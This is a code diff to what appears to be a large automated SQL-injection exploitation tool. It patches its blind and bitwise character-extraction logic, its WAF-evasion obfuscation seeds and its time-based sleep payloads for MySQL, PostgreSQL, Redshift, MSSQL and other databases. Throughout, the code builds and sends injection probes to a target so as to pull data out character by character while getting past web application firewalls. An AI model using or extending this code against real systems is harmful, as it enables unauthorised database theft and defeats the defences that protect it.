@@ -44389,11 +44389,12 @@ def build_extraction_with_variation(
         return ""   # Caller will use its own template fallback
 
     # Step 2: Apply variation based on level
-    if variation_level == 0:
-        # Exact reuse - no variation
-        return base_payload
-
-    elif variation_level == 1:
+    # BUG-V214-DEAD-VAR0 FIX: Removed variation_level==0 branch that returned the raw
+    # base_payload with no obfuscation. get_variation_level() never returns 0 (enforced
+    # since BUG-EXTVAR-NO-OBFUSCATION FIX), but the dead branch was a latent trap: any
+    # direct caller passing variation_level=0 would get a plain, unobfuscated payload
+    # sent to the target — the worst possible WAF evasion outcome.
+    if variation_level == 1:
         # Light variation — pass surface so URL-encoding is skipped on JSON/etc.
         return apply_light_variation(base_payload, request_num, data_fmt=data_fmt)
 
@@ -44975,7 +44976,7 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                     baseline["modal_status"] = getattr(_bec_ref_fp, 'status_code', 200)
             except Exception:
                 pass  # keep stub; oracle will be unreliable but won't crash
-        for pivot in [97,65,48,32,128]:
+        for _piv_idx, pivot in enumerate([97,65,48,32,128]):
             if gt_blocked:
                 cond=f"{char_func} BETWEEN {pivot} AND {char_hi}"
             else:
@@ -44995,18 +44996,20 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
             # fingerprint per-session structural repetition detect this within 3-4
             # character extractions and block position 4+.
             # Fix: incorporate `pos` (the 1-based character position being extracted)
-            # into the seed via `iterations + pos * 100`. The ×100 factor ensures
+            # into the seed via `_piv_idx + pos * 100`. The ×100 factor ensures
             # seeds for different positions never alias within a normal string length
             # (max 128 chars × 100 = 12800, well below 50,000 random-rotation period).
-            # BUG-V190-004-COMPLETE FIX: `pos` is now a real parameter of
-            # _blind_extract_char_inner (added by Fix 1c), so the seed correctly
-            # varies per character position. No try/except fallback needed.
+            # BUG-V214-PIVOT-SEED FIX: The original code used `iterations + pos * 100`
+            # but `iterations` is only incremented inside the `while lo<hi` binary
+            # search loop — it is ALWAYS 0 during the pivot loop. Result: all 5 pivot
+            # probes at the same character position use the same seed (pos * 100),
+            # producing identical comment-body obfuscation patterns across all pivots.
+            # Fix: use `_piv_idx` (enumerate index 0..4) so each of the 5 pivots
+            # gets a distinct seed: seeds = [pos*100, pos*100+1, ..., pos*100+4].
             # Numeric safety: seed only affects comment body rotation, keyword
             # case-mixing, and noise-token selection — SQL comparison operands
             # (pivot, char_hi, >= / BETWEEN) are NEVER rewritten.
-            # ×100 factor: max 128 chars × 100 = 12800, well below the
-            # 50,000 random-rotation period, so positions never alias.
-            _bec_pivot_seed = iterations + pos * 100
+            _bec_pivot_seed = _piv_idx + pos * 100
             cond = _obfuscate_extraction_cond(cond, _bec_pivot_seed)
             cond = apply_sql_noise(cond, _bec_pivot_seed)
             
@@ -45200,6 +45203,17 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
         # Without this distinction, NUL bytes in binary/BLOB columns caused
         # blind_extract_string to stop extraction mid-string (None → "?" or stop),
         # silently truncating strings at the first NUL byte.
+        # BUG-V214-BSEARCH-CLEAN-HOIST FIX: _original_clean_bsearch is a deterministic
+        # function of `original` (a parameter that never changes within this call).
+        # The previous code re-evaluated it on every binary-search iteration (up to 50×
+        # per character) and re-defined _hex_to_dec_bsearch as a new function object each
+        # time for PG/Oracle targets. Compute it once here; the while loop below reads it.
+        _original_clean_bsearch = _re.sub(r'\s*(?:--\s*-?|-#|#)\s*$', '', original).rstrip() if original else ""
+        if _detected_dbms.upper() in ('POSTGRESQL', 'ORACLE') and _original_clean_bsearch:
+            def _hex_to_dec_bsearch(m):
+                try: return str(int(m.group(0), 16))
+                except ValueError: return m.group(0)
+            _original_clean_bsearch = _re.sub(r'\b0x[0-9a-fA-F]+\b', _hex_to_dec_bsearch, _original_clean_bsearch)
         _bsearch_converged = False  # BUG-V49-NULL-CHAR-AMBIGUITY FIX: true = lo==hi naturally
 
         # Binary search for exact char
@@ -45368,17 +45382,8 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
             # FIX-ORIGINAL-CLEAN-DEFAULT: Changed default from "1" to "".
             # Same fix as _original_clean_bec above — empty original must not
             # prepend a literal "1" to the binary-search payload.
-            _original_clean_bsearch = _re.sub(r'\s*(?:--\s*-?|-#|#)\s*$', '', original).rstrip() if original else ""
-            # BUG-C FIX: Strip 0x hex integer literals from _original_clean_bsearch for PG/Oracle.
-            # Same root cause as _original_clean_bec above (BUG-C Fix 1).
-            # _bsearch_full = _original_clean_bsearch + payload is sent for every binary-search step.
-            # Without this fix, 0x literals in original corrupt every character-extraction probe.
-            if _detected_dbms.upper() in ('POSTGRESQL', 'ORACLE') and _original_clean_bsearch:
-                def _hex_to_dec_bsearch(m):
-                    try: return str(int(m.group(0), 16))
-                    except ValueError: return m.group(0)
-                _original_clean_bsearch = _re.sub(r'\b0x[0-9a-fA-F]+\b', _hex_to_dec_bsearch, _original_clean_bsearch)
-            
+            # _original_clean_bsearch computed once before the while loop (BUG-V214-BSEARCH-CLEAN-HOIST FIX)
+
             #  Send with timeout
             try:
                 # BUG-V147-BECH-BSEARCH-ADAPTIVE-LIGHT FIX (HIGH, all 5 DBMSes, all techniques,
@@ -81940,6 +81945,45 @@ class BitwiseExtractor:
                 except Exception:
                     return None  # treat unexpected exceptions same as _probe_bit all-retries-failed
 
+        # BUG-V214-BITWISE-POLARITY FIX (HIGH, all 5 DBMSes, B/BH technique, all surfaces):
+        # BitwiseExtractor.extract_char compared each bit's sim score against a fixed
+        # threshold — `s > self._sim_thresh` → bit=1. This assumes "TRUE condition →
+        # high sim-to-baseline" (normal polarity). On CDN-cached empty baselines both
+        # the baseline and ALL probe responses can be cached empty pages, making all
+        # sims ≈ 1.0 → all bits=1 → char_code=255 → garbage for every character.
+        # Alternatively, if WAF blocks TRUE-condition probes (returning empty) while
+        # passing FALSE-condition probes (returning real page), polarity is reversed:
+        # TRUE → empty → sim HIGH vs empty baseline → wrong bit=1 when it should be 0.
+        # Fix: send two calibration probes (1=1 always-TRUE, 1=2 always-FALSE) before
+        # the real bit probes. If FALSE yields higher sim than TRUE, set _polarity_inverted
+        # and flip the threshold comparison. This mirrors the differential oracle used in
+        # detect_boolean() and _waf_aware_eval() where polarity is handled automatically.
+        _polarity_inverted = False
+        try:
+            async def _probe_bool_calibration(_cond_expr: str) -> Optional[float]:
+                _pc_probe = (self._det_tmpl.replace("[INFERENCE]", _cond_expr)
+                             if self._det_tmpl else
+                             f"{self._inj_prefix} AND {_cond_expr}-- -")
+                self._probe_count += 1
+                _pc_probe = apply_heavy_variation(_pc_probe, self._probe_count, data_fmt=self.data_fmt)
+                _pc_fp = await _send_injected(
+                    self.engine, self.method, self.url, self.data, self.data_fmt,
+                    self.result.param, self._clean_original + _pc_probe, self.tamper_chain)
+                if not _validate_response(_pc_fp, allow_empty=False, func_name="BitwiseExtractor.polarity"):
+                    return None
+                _pc_nb = _normalise_response_safe(_pc_fp, func_name="BitwiseExtractor.polarity", default=b"")
+                return SimHasher.body_similarity(self._norm_sample, _pc_nb) if _pc_nb else None
+            _sim_true_cal, _sim_false_cal = await asyncio.gather(
+                _probe_bool_calibration("1=1"), _probe_bool_calibration("1=2"))
+            if _sim_true_cal is not None and _sim_false_cal is not None:
+                _polarity_inverted = bool(_sim_false_cal > _sim_true_cal)
+                if _polarity_inverted:
+                    LOG.debug(
+                        f"BitwiseExtractor: reversed polarity (sim_true={_sim_true_cal:.3f}, "
+                        f"sim_false={_sim_false_cal:.3f}) — inverting bit assignment")
+        except Exception:
+            pass  # Keep normal polarity on any error; extraction may still succeed
+
         sims = await asyncio.gather(
             *[probe_bit_safe(b) for b in range(max_bits)],
             return_exceptions=True)
@@ -81953,7 +81997,10 @@ class BitwiseExtractor:
         # than inflating it.  The old behaviour (return 0.0 on failure) made max(0,1)=1.0
         # appear as 100% confident False — a single failed probe blocked fallback.
         _valid = lambda s: s is not None and not isinstance(s, BaseException)
-        bits_resolved = [1 if (_valid(s) and s > self._sim_thresh) else 0
+        # BUG-V214-BITWISE-POLARITY FIX: XOR with _polarity_inverted flips the comparison
+        # when the oracle is reversed. Normal: (s>thresh) XOR False = s>thresh.
+        # Reversed: (s>thresh) XOR True = not (s>thresh) = s<=thresh → bit inverted.
+        bits_resolved = [1 if (_valid(s) and ((s > self._sim_thresh) != _polarity_inverted)) else 0
                          for s in sims]
         # Pad to 8 bits if we skipped bit 7
         while len(bits_resolved) < 8:
@@ -118519,13 +118566,21 @@ class UniversalScanOrchestrator:
                                                     if _db in ('MySQL', 'MariaDB', 'TiDB'):
                                                         # BUG-ITO-CRDB-YG-SYBASE-BRANCH FIX: added TiDB (MySQL-compat: IF/SLEEP work)
                                                         _pay = f"{_o}{_ipfx} AND IF({_cond},SLEEP({_ts}),0)-- -"
-                                                    elif _db in ('PostgreSQL', 'CockroachDB', 'YugabyteDB'):
+                                                    elif _db in ('PostgreSQL', 'CockroachDB', 'YugabyteDB', 'Amazon Redshift'):
                                                         # BUG-ITO-CRDB-YG-SYBASE-BRANCH FIX: CockroachDB/YugabyteDB are PG-wire-compatible;
                                                         # pg_sleep() works on both. The previous else branch emitted SLEEP() which does
                                                         # not exist in CockroachDB/YugabyteDB, causing the timing oracle to always fail
                                                         # (server returns a syntax error → asyncio.wait_for returns instantly → elapsed_ms≈0
                                                         # → oracle always False → all bits 0 → chr(0) for every character extracted).
-                                                        _pay = f"{_o}{_ipfx} AND (CASE WHEN ({_cond}) THEN (SELECT pg_sleep({_ts})) ELSE (SELECT pg_sleep(0)) END) IS NOT NULL-- -"  # FIX-17: pg_sleep() returns void; subquery+IS NOT NULL makes it boolean
+                                                        # BUG-ITO-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; pg_sleep() works.
+                                                        # Without this fix Redshift fell to else: SLEEP() which doesn't exist in Redshift
+                                                        # → SQL error → Exception → return False → all bits 0 → garbage extraction.
+                                                        # BUG-ITO-PG-VOID-CAST FIX: pg_sleep() returns void. On PostgreSQL ≤12 the DBMS
+                                                        # raises "function returning void cannot appear in this context" for the bare
+                                                        # subquery form (SELECT pg_sleep(N)). CAST(pg_sleep(N) AS TEXT) coerces void
+                                                        # to an empty string — a valid scalar — before IS NOT NULL evaluates it.
+                                                        # timing_payload() (line 134107) already uses this CAST form; now consistent.
+                                                        _pay = f"{_o}{_ipfx} AND (CASE WHEN ({_cond}) THEN (SELECT CAST(pg_sleep({_ts}) AS TEXT)) ELSE (SELECT CAST(pg_sleep(0) AS TEXT)) END) IS NOT NULL-- -"
                                                     elif _db in ('MSSQL', 'Sybase'):
                                                         # BUG-ITO-CRDB-YG-SYBASE-BRANCH FIX: added Sybase (T-SQL compatible;
                                                         # uses CROSS JOIN heavy-query same as MSSQL — WAITFOR DELAY is also valid
